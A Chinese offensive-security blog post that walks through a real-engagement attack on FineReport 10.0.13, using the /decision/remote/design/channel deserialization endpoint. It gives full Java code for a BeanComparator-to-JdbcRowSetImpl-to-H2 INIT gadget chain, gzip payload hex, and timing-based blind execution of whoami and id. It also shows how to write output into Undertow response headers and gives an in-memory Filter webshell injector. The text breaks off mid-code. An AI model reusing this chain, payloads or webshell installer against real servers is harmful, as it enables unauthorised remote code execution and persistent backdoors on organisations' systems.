---
title: 被当成Shiro的FineReport反序列化
slug: finereport-10-channel-deserialization
description: ""
date: 2026-09-09T13:27:46+08:00
lastmod: 2026-09-09T13:27:46+08:00
author: baozongwi
categories:
  - Offensive
tags:
  - JDBC
  - JNDI
  - CB链
  - Shiro
  - FineReport
---
## TL;DR 

上次打省护遇到的一个站点，最终也是成功挂马了，这个资产的发现过程并不是我，而是同事过了一遍扫描器之后，扫描器爆出是 Shiro  默认密钥再用agent 跑一遍没成功才扔给我的，回头想起来这个利用很有意思也很经典，甚至说可以作为一道 CTF 题目出出来，现在一起来看看吧。

这次打了不少帆软的版本 8 9 10 11 12 都 getshell 过，这个目标是 FineReport 10.0.13 / FineBI 5.1.10，最终打的是 `POST /webroot/decision/remote/design/channel` 这个接口，会把 gzip 过的 Java 对象读进来，也就是反序列化，常用的 TemplatesImpl、CC 链用不了，也不出网、无回显。

ps：由于是从本地回忆这件事情，去找本地缓存的 poc 和 HTTP 包，所以本文没有图片

## 探测

访问 `/webroot/decision/system/info` 以及手动 fuzz 得到以下信息

- FineReport `10.0.13` / FineBI `5.1.10`，JAR 时间 `persist-2021.01.23`（官方 2022-08-12 修这个口之前）
- 前面 nginx 1.22，报错栈已经是 Undertow
- Spring 只有帆软自己改过包名的 `com.fr.third.springframework.*`
- `GET /webroot/decision/remote/design/channel` 回 500，这个口挂着
- `POST` 同一路径，body 必须是 gzip 压缩的 Java 序列化数据
- 登录默认口 SM4 加密并且无弱口令、默认密码

```http
GET /webroot/decision/system/info HTTP/1.1
Host: x.x.x.x:8094
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36
Accept: */*
```

```http
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Content-Length: 1641

{"data":{"transferred":false,"frontSM4Key":"****","frontSeed":"****","versionInfo":[{"minorVersion":"10.0.13","jarTime":"Build#persist-2021.01.23.08.46.15.546","name":"core"},{"minorVersion":"10.0.13","jarTime":"Build#persist-2021.01.23.08.52.19.120","name":"decision"},{"minorVersion":"10.0.13","jarTime":"Build#persist-2021.01.25.11.03.31.957","name":"report"},{"minorVersion":"5.1.10","jarTime":"Build#persist-2021.02.26.16.10.43.384","name":"bi"}],"title":"****","transmissionEncryption":2,"loginTitle":"****"}}
```

先 gzip 一个普通 `String` 打进去，对象已经被读出来了。帆软读完还想把它当成远程设计的数据包，所以回的是类型转换错误，不是命令结果。

```http
POST /webroot/decision/remote/design/channel HTTP/1.1
Host: x.x.x.x:8094
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/octet-stream
Content-Length: 31

1f8b08000000000000005bf39681b58481a524b5b804002ee2800e0b000000
```

回显解出来

```text
java.lang.ClassCastException:
java.lang.String cannot be cast to
com.fr.rpc.serialization.InvocationSerializer$InvocationPack
```

栈里已经有 Undertow。

### classpath

既然能够反序列化，那么 classpath 是必不可少的信息，这影响着 gadget 构造。帆软读对象时会看类名，类不在，回「找不到这个类」；类在但序列化版本号对不上，回「本地类不兼容」，所以不扔完整利用链，只扔一个只有类名、版本号写成 0、一个字段都没有的空对象，gzip 后 POST，通过回显判断这个类在不在。

空对象长这样：

```text
ac ed 00 05          序列化文件头
73                   这是一个对象
72                   后面是类描述
00 xx + 类名
00 00 00 00 00 00 00 00   版本号故意写成 0
02                   可序列化
00 00                没有字段
78
70                   没有父类描述
```

```java
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.util.zip.GZIPOutputStream;

public class ClassProbe {
    static byte[] gzip(byte[] data) throws Exception {
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        GZIPOutputStream g = new GZIPOutputStream(bo);
        g.write(data);
        g.finish();
        g.close();
        return bo.toByteArray();
    }

    static byte[] probeClass(String classname) throws Exception {
        byte[] name = classname.getBytes("UTF-8");
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        bo.write(new byte[]{(byte) 0xac, (byte) 0xed, 0x00, 0x05, 0x73, 0x72});
        bo.write((name.length >>> 8) & 0xff);
        bo.write(name.length & 0xff);
        bo.write(name);
        bo.write(new byte[8]);
        bo.write(0x02);
        bo.write(0x00);
        bo.write(0x00);
        bo.write(0x78);
        bo.write(0x70);
        return gzip(bo.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        FileOutputStream fo = new FileOutputStream(args[1]);
        fo.write(probeClass(args[0]));
        fo.close();
    }
}
```

回包的大致情况如下

| 回包里有什么                              | 说明                           |
| ----------------------------------------- | ------------------------------ |
| `ClassNotFoundException`                  | 没有这个类，或帆软不让加载     |
| `InvalidClassException` 且提到版本号      | 有这个类，只是版本号对不上     |
| `String cannot be cast to InvocationPack` | 对象读出来了，但不是远程设计包 |
| `Serialization support ... is disabled`   | 类在，但读对象时被关掉了       |

`BeanComparator` 现场包，77 字节，回 2160 字节、版本号对不上（fuzz 出来是 CB1.8.3 依赖）：

```http
POST /webroot/decision/remote/design/channel HTTP/1.1
Host: x.x.x.x:8094
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/octet-stream
Content-Length: 77

1f8b08000000000002ff5bf39681b5b888413bbf285d2fb120313923552f393f
37373faf582f293531afb42433a758cf09c872cecf2d482c4a2cc92f62800226
06868a0200d3b9074440000000
```

`TemplatesImpl` 现场包，92 字节，回找不到这个类：

```http
POST /webroot/decision/remote/design/channel HTTP/1.1
Host: x.x.x.x:8094
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/octet-stream
Content-Length: 92

1f8b08000000000002ff5bf39681b5b888c12a393f57afb8344f2fbf285d2fb1
2031392355af223127314f2f33af24b5282f3147afa238a72459afa428b1422f
2435b72027b124b5d81348334001130343450100fea69ecd4f000000
```

结果如下

| 类                                                           | 结果                 |
| ------------------------------------------------------------ | -------------------- |
| `org.apache.commons.beanutils.BeanComparator`                | 有，本地必须 1.8.3   |
| `org.apache.commons.collections.functors.InvokerTransformer` | 有，但读对象时被关掉 |
| `org.apache.commons.collections4.*`                          | 没有                 |
| `TemplatesImpl` 三条包名                                     | 没有                 |
| `groovy` / `bsh` / `ognl` / `mvel`                           | 没有                 |
| `com.sun.rowset.JdbcRowSetImpl`                              | 有                   |
| `org.h2.Driver`、H2 数据源、H2 源码编译                      | 都有                 |
| `com.mchange.v2.c3p0.*`                                      | 有                   |
| Undertow 的 Filter 管理类                                    | 有                   |
| Tomcat 的 `StandardContext`                                  | 没有                 |
| `com.fr.third.springframework.web.context.request.RequestContextHolder` | 有                   |
| 原生 `org.springframework...RequestContextHolder`            | 没有                 |

`InvokerTransformer` 真链打进去，CC 是 3.3.2 之后打版本应该，不允许被序列化了

```text
Serialization support for org.apache.commons.collections.functors.InvokerTransformer
is disabled for security reasons.
```

让目标反连我们（`JdbcRowSetImpl` 去 lookup ldap）也能触发，但目标出网有白名单，百度 80 通，连我就连不了，但是 getter 没有断，经典的 JNDI + JDBC。

## gadget 构造

常见两条就是 BeanComparator 去调 `TemplatesImpl`，或者去调 `JdbcRowSetImpl`。但是这里都不行，不过我们 getter 还是在，按照设想如下

```text
优先队列恢复
  → BeanComparator 比较两个元素
    → 按 property 名字去调 getter
      → 这里调 JdbcRowSetImpl.getDatabaseMetaData()
        → 用我们写进去的 JDBC 地址连库
```

`JdbcRowSetImpl` 只设置 `url` / 用户名 / 密码，不设置 `dataSourceName`，在有 url、没有 dataSourceName 的情况，就会走本机 JDBC，而不会去 ldap 反连。

发现目标 H2，普通的 `CREATE ALIAS` 即可，也不需要 @fushuling 博客里面那些 bypass。

```java
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.zip.GZIPOutputStream;

public class FrH2 {
    static void setField(Object obj, String name, Object value) throws Exception {
        Field f = null;
        Class<?> c = obj.getClass();
        while (c != null) {
            try {
                f = c.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(name);
        }
        f.setAccessible(true);
        f.set(obj, value);
    }

    static byte[] gzip(byte[] data) throws Exception {
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        GZIPOutputStream g = new GZIPOutputStream(bo);
        g.write(data);
        g.finish();
        g.close();
        return bo.toByteArray();
    }

    static Object pq(Object sink) throws Exception {
        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add("1");
        queue.add("1");
        setField(comparator, "property", "databaseMetaData");
        setField(queue, "queue", new Object[]{sink, sink});
        return queue;
    }

    static byte[] build(String url) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setUrl(url);
        rs.setUsername("sa");
        rs.setPassword("");
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bo);
        oos.writeObject(pq(rs));
        oos.close();
        return gzip(bo.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        String mem = args[0];
        String mode = args[1];
        String out = args[2];
        String url;
        if ("sleep".equals(mode)) {
            url = "jdbc:h2:mem:" + mem + ";INIT=CREATE ALIAS S FOR \"java.lang.Thread.sleep\"\\;CALL S(" + args[3] + ")";
        } else if ("src".equals(mode)) {
            String src = args[3].replace(";", "\\;");
            url = "jdbc:h2:mem:" + mem + ";INIT=CREATE ALIAS E AS '" + src + "'\\;CALL E()";
        } else {
            throw new IllegalArgumentException(mode);
        }
        FileOutputStream fo = new FileOutputStream(out);
        fo.write(build(url));
        fo.close();
    }
}
```

## 远程 RCE

先让目标睡 3 秒。`JdbcRowSetImpl` 的 url 是

```text
jdbc:h2:mem:s1;INIT=CREATE ALIAS SLEEP FOR "java.lang.Thread.sleep"\;CALL SLEEP(3000)
```

```http
POST /webroot/decision/remote/design/channel HTTP/1.1
Host: x.x.x.x:8094
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/octet-stream
Content-Length: 970

1f8b08000000000000008d54cf6b2445147e339398d999954c36c6053518832b
ae424fd48b6490353b49b0979e649c99154972a9e97e663a745775aaaa333dc2
2eba073d08e261c5a31ef4b6200b1e046ffb0744bcb99e1651f0a0b09e3c08ea
abeef9b5a0601d8afaf1bdf7bef7de5775eb37985512ce1fb11366c5da0faca6
f485f4f5e0f51863bcf9c3da577f5eba71bb00791b6694ff363a5072451831c9
b4901a1e758c65d55856ebe3f35a1201409e1c3f2fe4a1c522e6f6d022bb5070
6575917163a0accbb49a587dfb61eec65f3bbf5fcf43fe8128c7701d720e1423
2922947aa0e15c163560fcb0dad6d2e7871491a23d97a6618eadecf8e93a5368
73855cf9da3fc149b07ee1e0da41f3e7d33c401269a8784cb32e811ba8d926ad
fb339441817c2e13114bc5dc92a2af505b57bcaedb12fd366a3b8c82d367be7f
d2567766f330e7c08c2b38d7b094b153c7a6249ca3ab7dc16b0e3cec3798767b
7511c42157e32cd2dabd4128aa9b03f9886e9e9878684a24c6e8b535d31822d7
849995a81a9b0fc05aa8e24013a9117f823d64181bdc851497a4c02c8b6a96c1
086c3231b125c57ee45f9cd2ddbcd2729abe694a3991f078eada22f8a84097a9
8a99fbfa77cb5f34eedcbe9787251bca541c379612b93bd8830a2a9745d894c2
45a5a8533614df4272bfe94b1bcea4cb36c98dd6be12013325b4e16cc8926d1f
032fbb9aa32d455274711ca31c74fc1045acf7a0289179bb3c18d850922995ce
20c23d28ab9ee86f62801a3d070a575b8e4963c6813253aeef93669085e306fa
a26af328d6d931d5e06cd7e74c0eb2bdb15c303aed313932ac8c0d5b44004d3f
e78cea19f786814a46676d114b17872767025f69e428b39212ad909120e7a7c4
d1609169a7516ea8c6f4d2abd798ea91700334fa8ab9ef0a0fa7f8997758b89f
a3e917c8461ea686b9f815345c3d2251aff75e5c0f315c572fd4ec1dbbf34abd
b5b5d1d95ad970ec8df64adbd9da6aae6cefb65656276facd33375b6548018ad
1ed4ea1b8e93019f7d696d6ded626406bda0cae473c9647ef7936bfbefd4becc
15a060c3826bbe07fa706ceeca54e1d44e6a9159d545ccf53e94875b23550d8b
fb53af7fb77b442eb3ff261db11c01328e43c047a76f7e5a511783f4b913ac14
8d47fa732c4e388e4bbaf8cdfc85a7aefcf4357d7edb500a04f3b699a14f9ad4
94396929f092e8d2ab69dc62bf4873d92c13cada54fffc90522936bbc7cc8a22
2d4cb8d95ce321ca733f7ef6f91fefbeff721e7236cc9eb020c66454b514b713
875d94efddfa78b97cf3de07690a7fd3305e57ffef94a4cdf80f5a53c530674b
c93f41f362ee17060000
```

没有问题执行，成功延时，再换成贴源码的写法，url 是：

```text
jdbc:h2:mem:s2;INIT=CREATE ALIAS E AS 'void e() throws Exception { java.lang.Thread.sleep(8000L)\; }'\;CALL E()
```

回来 8.12 秒，没毛病，直接写 Java 代码也可以。

### 盲打

channel 的 HTTP 正文永远是那串远程设计异常，也就是无回显，当时也还没找到怎么改响应头。

客户端能看见的，只剩这一发 POST 从发出到回来过了几秒。所以命令还是照常跑，结果先放在内存里，数一下有几个字符，再按字符数去 sleep，再根据结果用平日里的常理去对比。

```java
void e() throws Exception {
    String[] c = System.getProperty("os.name").toLowerCase().indexOf("win") >= 0
        ? new String[]{"cmd.exe", "/c", "whoami"}
        : new String[]{"/bin/sh", "-c", "whoami"};
    java.io.InputStream in = java.lang.Runtime.getRuntime().exec(c).getInputStream();
    java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
    byte[] b = new byte[64];
    int n;
    while ((n = in.read(b)) > 0) {
        bo.write(b, 0, n);
    }
    int len = new String(bo.toByteArray(), "UTF-8").trim().length();
    java.lang.Thread.sleep(3000L + 500L * (long) len);
}
```

URL 如下

```text
jdbc:h2:mem:w1;INIT=CREATE ALIAS E AS 'void e() throws Exception { String[] c=System.getProperty("os.name").toLowerCase().indexOf("win")>=0?new String[]{"cmd.exe","/c","whoami"}:new String[]{"/bin/sh","-c","whoami"}\; java.io.InputStream in=java.lang.Runtime.getRuntime().exec(c).getInputStream()\; java.io.ByteArrayOutputStream bo=new java.io.ByteArrayOutputStream()\; byte[] b=new byte[64]\; int n\; while((n=in.read(b))>0) bo.write(b,0,n)\; int len=new String(bo.toByteArray(),"UTF-8").trim().length()\; java.lang.Thread.sleep(3000L+500L*(long)len)\; }'\;CALL E()
```

`3000` 毫秒是保底命令能够执行，每个字符再加 500 毫秒，测试是 5.223 秒

```text
(5223 - 3000) / 500 ≈ 4
```

所以应该是 root，或者是其他的四个字符的用户名

```http
POST /webroot/decision/remote/design/channel HTTP/1.1
Host: x.x.x.x:8094
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/octet-stream
Content-Length: 1239

1f8b08000000000000008d55cd6f1b45149fd8094de3a2a62da51250612c4a77
db746da0a02a965b5227115b6d9a10a70835e961bcfb6a4fb53bb39d998dd754
a9a0073820210e451ce100372454890312b7fe0145dc80538540e200129c3820
016f761ddb95003187ddf9f8bdf77eef63de7cfa0b9952921cb946b7a9936816
3a6b9209c974ff950412b8fd5dedf33fceddba532405974c2af63a7864c61751
4c25d5426af2a86724ab46b2da1ceed7d398105240c52785ec3834a67e171c94
8b04574e1b283702ca398fb391d457ef4edcfaf3e26f370ba4f08095ebe42699
f0c8742c450c52f73539985b0d29ef545b5a32de418b68ed44e686d976f2eda7
9b5481cb1570c534db8691b15e716b676bedc77b0542d25893d9806ada46f00a
68ba88f3de247a50449d479188a312ee48d153a09d0b41db5f17bd1668378ac3
7bcf7cf3a4abee4e15c81e8f4cfa82734d0ee7ecd4751312cec1d74cf0ba471e
662b54fbdda6089388aba11759ec5e4514c6cd2385184f9e18695893808c2168
69aa2102ae11332541ad2c3e005b0795841a49edf247d84386b1c11dcb706906
ccbda8e61eec828d27c6b644db8ffc83523cdbafb41ca76f92524a25793c53ed
207c3740e7318ab9fae6d7473f59b97be77e811c76490983e3275202f7fb97c9
2c289fc6b026850f4a61a65c327d1550fd22932ed99b4d5b586e38674a84d484
d025fb229a2e330883fc680f2ed192c283eb09c8fe068b4024fa329996408355
1ef65d3223332a1bfd182e9392ea8ade2284a021f048f1d2ba67dc98f448892a
9f31ac19a0d130814c545d1e273adfc618ec6b334e653f5f1bc903a64ebb54ee
0ace0e05d79100987cee31554f7930303463eaac2512e9c360676fc894060e32
0f29d28a2816e4feb1e258a1b149a7a9dc480de965472f53d5c5c20dc1d457c2
992f0218e367ee61f1d709fcfc44f2512063c31cfc4c74e1f4352ceaf9ee73f3
1144f3bd10f8b375f7a2bbd168ae2f2d6c2c95173c77a155c67fab7c7c5bb0a0
0c965dd65d93eff252ea436cb253be51ceefdce695b2df68f5d1a9c8e9805e1b
dc5aab2294c3690415dbd1c2133d90e6725ab6c37800e9ea55abd263bc629f6d
d4ce71e80d95dda8f851e0400a95b94ad5c74faf2b68c42a3bf30fa2aa989caa
ea22e0d4386aab9ef504269cb15c96196f8c5ac57ac235568e213b98222934e8
5bbe6d36c7042d7ba4ef7c5fc38294b4bf9ae891e6b668185eff09325ada7880
916a67e86cf1e2e92b5b7564a6cb1cffbd2e0bc1b2788361e7c162b2dab67db6
66a37ea787ed19acf65c6d8ea3222380196b8ca26121468ba165cb9eab5cda58
3e75c6045e32b4ee20bea3bb4367b2286c748d19478500b1f57cad56f34ebe80
9f13562878c746094497778e6fd59b0b9e575eb2ecd80c6c90b3a3b723ef62df
7eb0b3f946fdb3892229bae4806fba3fbe272ef765d6c0f0b6e20d34b3a6c070
6f92d260693a91268736c79afb6afb1aaacc9f936c24721790b31e00debbf7da
87b3ca0eb36e8eb0997838b287e1d088e3f0c61cfa72ffb1a72efcf005be6dcb
6426143458a6863eb61cac6dc0561106697ceea5ccee746f1abf25334dd16b73
b98e0c28cd2466f59899a1a503236e2ed7d00179f0fb8f3efefdcdb7cf14c884
4ba6b6699840ba1bb50c773189da20dffaf4fda3a5dbf7dfc95cf80b87d15af9
bf9f344bc6bfd01a0b86d93b9cfe0d0d02c615f6070000
```

再跑一次 `id`，每个字符睡 200 毫秒、垫底 2 秒：

```java
void e() throws Exception {
    String[] c = System.getProperty("os.name").toLowerCase().indexOf("win") >= 0
        ? new String[]{"cmd.exe", "/c", "echo WIN"}
        : new String[]{"/bin/sh", "-c", "id"};
    java.io.InputStream in = java.lang.Runtime.getRuntime().exec(c).getInputStream();
    java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
    byte[] b = new byte[128];
    int n;
    while ((n = in.read(b)) > 0) {
        bo.write(b, 0, n);
    }
    int len = new String(bo.toByteArray(), "UTF-8").trim().length();
    java.lang.Thread.sleep(2000L + 200L * (long) len);
}
```

```text
jdbc:h2:mem:i1;INIT=CREATE ALIAS E AS 'void e() throws Exception { String[] c=System.getProperty("os.name").toLowerCase().indexOf("win")>=0?new String[]{"cmd.exe","/c","echo WIN"}:new String[]{"/bin/sh","-c","id"}\; java.io.InputStream in=java.lang.Runtime.getRuntime().exec(c).getInputStream()\; java.io.ByteArrayOutputStream bo=new java.io.ByteArrayOutputStream()\; byte[] b=new byte[128]\; int n\; while((n=in.read(b))>0) bo.write(b,0,n)\; int len=new String(bo.toByteArray(),"UTF-8").trim().length()\; java.lang.Thread.sleep(2000L+200L*(long)len)\; }'\;CALL E()
```

回来 9.905 秒，推出来大约 38 个字符，对得上

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 回显

成功 RCE 之后就是挂马或者是把回显造出来，前面我们提到他的 Spring 是用的帆软二开的，这个玩意是开源的，审计下就能够发现帆软的 Spring 里有 `RequestContextHolder`，能拿到当前请求，原生 `org.springframework` 那套反而还没有，🙂‍↔️二开真是太害人了，不得不说我某次绕过社区版 safeline 的故事了，算了扯远了🙌。

第一发跑命令，把输出放到 JVM 的系统属性里

```java
void e() throws Exception {
    boolean win = System.getProperty("os.name").toLowerCase().indexOf("win") >= 0;
    String[] c = win
        ? new String[]{"cmd.exe", "/c", "whoami"}
        : new String[]{"/bin/sh", "-c", "whoami"};
    java.io.InputStream in = Runtime.getRuntime().exec(c).getInputStream();
    java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
    byte[] b = new byte[4096];
    int n;
    while ((n = in.read(b)) > 0) {
        bo.write(b, 0, n);
    }
    System.setProperty("fr8094out", new String(bo.toByteArray(), "UTF-8").trim());
}
```

```text
jdbc:h2:mem:e1;INIT=CREATE ALIAS E AS 'void e() throws Exception { boolean w=System.getProperty("os.name").toLowerCase().indexOf("win")>=0\; String[] c=w?new String[]{"cmd.exe","/c","whoami"}:new String[]{"/bin/sh","-c","whoami"}\; java.io.InputStream in=java.lang.Runtime.getRuntime().exec(c).getInputStream()\; java.io.ByteArrayOutputStream bo=new java.io.ByteArrayOutputStream()\; byte[] b=new byte[4096]\; int n\; while((n=in.read(b))>0) bo.write(b,0,n)\; java.lang.System.setProperty("fr8094out", new String(bo.toByteArray(),"UTF-8").trim())\; }'\;CALL E()
```

第二发把这个属性写到响应头 `X-Out`，从当前请求拿到 Undertow 的 exchange，再往响应头表里 put

```java
void e() throws Exception {
    String s = System.getProperty("fr8094out");
    ClassLoader cl = Thread.currentThread().getContextClassLoader();
    Object attrs = cl.loadClass(
            "com.fr.third.springframework.web.context.request.RequestContextHolder")
        .getMethod("getRequestAttributes")
        .invoke(null);
    Object req = attrs.getClass().getMethod("getRequest").invoke(attrs);
    Object exchange = req.getClass().getMethod("getExchange").invoke(req);
    Object headers = exchange.getClass().getMethod("getResponseHeaders").invoke(exchange);
    Class httpString = cl.loadClass("io.undertow.util.HttpString");
    headers.getClass()
        .getMethod("put", httpString, String.class)
        .invoke(headers, httpString.getConstructor(String.class).newInstance("X-Out"), s);
}
```

```text
jdbc:h2:mem:e2;INIT=CREATE ALIAS E AS 'void e() throws Exception { String s=java.lang.System.getProperty("fr8094out")\; Object a=java.lang.Thread.currentThread().getContextClassLoader().loadClass("com.fr.third.springframework.web.context.request.RequestContextHolder").getMethod("getRequestAttributes").invoke(null)\; Object q=a.getClass().getMethod("getRequest").invoke(a)\; Object x=q.getClass().getMethod("getExchange").invoke(q)\; Object hs=x.getClass().getMethod("getResponseHeaders").invoke(x)\; ClassLoader cl=java.lang.Thread.currentThread().getContextClassLoader()\; Class ht=cl.loadClass("io.undertow.util.HttpString")\; Class st=Class.forName("java.lang.String")\; hs.getClass().getMethod("put",ht,st).invoke(hs,ht.getConstructor(st).newInstance("X-Out"),s)\; }'\;CALL E()
```

两发的内存库名字不要重复，第二发的回显就能看到 `root`啦🤪

### 挂马

命令能跑、响应头能写之后，同一条链把内存马送进当前 Web 的类加载器。把注入器 class 解出来，`defineClass`，再调 `install()`。`install()` 从当前请求拿到 ServletContext，补 Undertow 的 Filter 定义、运行实例和 URL 映射，最后刷新路径缓存。

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

public final class Y {
    private static final String FILTER_CLASS = "<FILTER_CLASS>";
    private static final String FILTER_NAME = "<FILTER_NAME>";
    private static final String FILTER_DATA = "<FILTER_DATA>";

    public Y() {
        System.setProperty("fr8094.higan", install());
    }

    public static String install() {
        try {
            ClassLoader loader = Thread.currentThread().getContextClassLoader();
            ensureFilter(loader);
            Object context = servletContext(loader);
            Object deployment = invoke(context, "getDeployment", new Object[0]);
            Object info = invoke(deployment, "getDeploymentInfo", new Object[0]);
            Map definitions = (Map) invoke(info, "getFilters", new Object[0]);
            Object filterInfo = definitions.get(FILTER_NAME);
            int addedDefinition = 0;
            int addedManaged = 0;
            int addedMapping = 0;
            if (filterInfo == null) {
                Class filterClass = Class.forName(FILTER_CLASS, false, loader);
                Object filter = filterClass.newInstance();
                Class factoryType = Class.forName("io.undertow.servlet.util.ImmediateInstanceFactory", true, loader);
                Object factory = factoryType.getConstructor(new Class[] {Object.class}).newInstance(new Object[] {filter});
                Class infoType = Class.forName("io.undertow.servlet.api.FilterInfo", true, loader);
                Constructor selected = null;
                Constructor[] constructors = infoType.getConstructors();
                for (int index = 0; index < constructors.length; index++) {
                    if (constructors[index].getParameterTypes().length == 3) {
                        selected = constructors[index];
                        break;
                    }
                }
                if (selected == null) {
                    throw new NoSuchMethodException("FilterInfo");
                }
                filterInfo = selected.newInstance(new Object[] {FILTER_NAME, filterClass, factory});
                invoke(info, "addFilter", new Object[] {filterInfo});
                addedDefinition = 1;
            }
            Object managedFilters = invoke(deployment, "getFilters", new Object[0]);
            Map managed = (Map) invoke(managedFilters, "getFilters", new Object[0]);
            if (!managed.containsKey(FILTER_NAME)) {
                invoke(managedFilters, "addFilter", new Object[] {filterInfo});
                addedManaged = 1;
            }
            List mappings = (List) invoke(info, "getFilterMappings", new Object[0]);
            boolean mapped = false;
            for (int index = 0; index < mappings.size(); index++) {
                Object mapping = mappings.get(index);
                if (FILTER_NAME.equals(String.valueOf(invoke(mapping, "getFilterName", new Object[0])))) {
                    mapped = true;
                    break;
                }
            }
            if (!mapped) {
                Class dispatcherType = Class.forName("javax.servlet.DispatcherType", true, loader);
                Object request = dispatcherType.getField("REQUEST").get(null);
                try {
                    invoke(info, "insertFilterUrlMapping", new Object[] {Integer.valueOf(0), FILTER_NAME, "/*", request});
                } catch (Throwable ignored) {
                    invoke(info, "addFilterUrlMapping", new Object[] {FILTER_NAME, "/*", request});
                }
                addedMapping = 1;
            }
            Object paths = invoke(deployment, "getServletPaths", new Object[0]);
            invoke(paths, "invalidate", new Object[0]);
            return "registered:context=" + String.valueOf(invoke(context, "getContextPath", new Object[0])) + ":definition=" + addedDefinition + ":managed=" + addedManaged + ":mapping=" + addedMapping + ":status=" + status(context);
        } catch (Throwable error) {
            Throwable cause = error.getCause() == null ? error : error.getCause();
            return "error:" + cause.getClass().getName() + ":" + String.valueOf(cause.getMessage());
        }
    }

    public static String status() {
        try {
            return status(servletContext(Thread.currentThread().getContextClassLoader()));
        } catch (Throwable error) {
            return "error:" + error.getClass().getName() + ":" + String.valueOf(error.getMessage());
        }
    }

    private static String status(Object context) throws Exception {
        Object deployment = invoke(context, "getDeployment", new Object[0]);
        Object info = invoke(deployment, "getDeploymentInfo", new Object[0]);
        Map definitions = (Map) invoke(info, "getFilters", new Object[0]);
        Object managedFilters = invoke(deployment, "getFilters", new Object[0]);
        Map managed = (Map) invoke(managedFilters, "getFilters", new Object[0]);
        List mappings = (List) invoke(info, "getFilterMappings", new Object[0]);
        int count = 0;
        for (int index = 0; index < mappings.size(); index++) {
            Object mapping = mappings.get(index);
            if (FILTER_NAME.equals(String.valueOf(invoke(mapping, "getFilterName", new Object[0])))) {
                count++;
            }
        }
        return "definitions=" + (definitions.containsKey(FILTER_NAME) ? 1 : 0) + ":managed=" + (managed.containsKey(FILTER_NAME) ? 1 : 0) + ":mappings=" + count;
    }

    private static Object servletContext(ClassLoader loader) throws Exception {
        Class holder = Class.forName("com.fr.third.springframework.web.context.request.RequestContextHolder", true, loader);
        Object attributes = holder.getMethod("getRequestAttributes", new Class[0]).invoke(null, new Object[0]);
        if (attributes == null) {
            throw new IllegalStateException("request attributes");
        }
        Object request = invoke(attributes, "getRequest", new Object[0]);
        return invoke(request, "getServletContext", new Object[0]);
    }

    private static void ensureFilter(ClassLoader loader) throws Exception {
        try {
            Class.forName(FILTER_CLASS, false, loader);
            return;
        } catch (ClassNotFoundException ignored) {
        }
        byte[] data = unpack(decode(FILTER_DATA));
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", new Class[] {byte[].class, Integer.TYPE, Integer.TYPE});
        method.setAccessible(true);
        try {
            method.invoke(loader, new Object[] {data, Integer.valueOf(0), Integer.valueOf(data.length)});
        } catch (Throwable error) {
            Class.forName(FILTER_CLASS, false, loader);
        }
    }

    private static byte[] decode(String value) throws Exception {
        Class type = Class.forName("sun.misc.BASE64Decoder");
        Method method = type.getMethod("decodeBuffer", new Class[] {String.class});
        return (byte[]) method.invoke(type.newInstance(), new Object[] {value});
    }

    private static byte[] unpack(byte[] data) throws Exception {
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(data));
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int count;
        while ((count = input.read(buffer)) != -1) {
            output.write(buffer, 0, count);
        }
        input.close();
        return output.toByteArray();
    }

    private static Object invoke(Object object, String name, Object[] arguments) throws Exception {
        Class type = object instanceof Class ? (Class) object : object.getClass();
        while (type != null) {
            Method[] methods = type.getDeclaredMethods();
            for (int index = 0; index < methods.length; index++) {
                Method method = methods[index];
                if (!method.getName().equals(name) || method.getParameterTypes().length != arguments.length) {
                    continue;
                }
                if (!compatible(method.getParameterTypes(), arguments)) {
                    continue;
                }
                method.setAccessible(true);
                return method.invoke(object instanceof Class ? null : object, arguments);
            }
            type = type.getSuperclass();
        }
        throw new NoSuchMethodException(name);
    }

    private static boolean compatible(Class[] types, Object[] values) {
        for (int index = 0; index < types.length; index++) {
            if (values[index] == null) {
                continue;
            }
            Class type = types[index];
            if (type.isPrimitive()) {
                if (type == Integer.TYPE && values[index] instanceof Integer) continue;
                if (type == Boolean.TYPE && values[index] instanceof Boolean) continue;
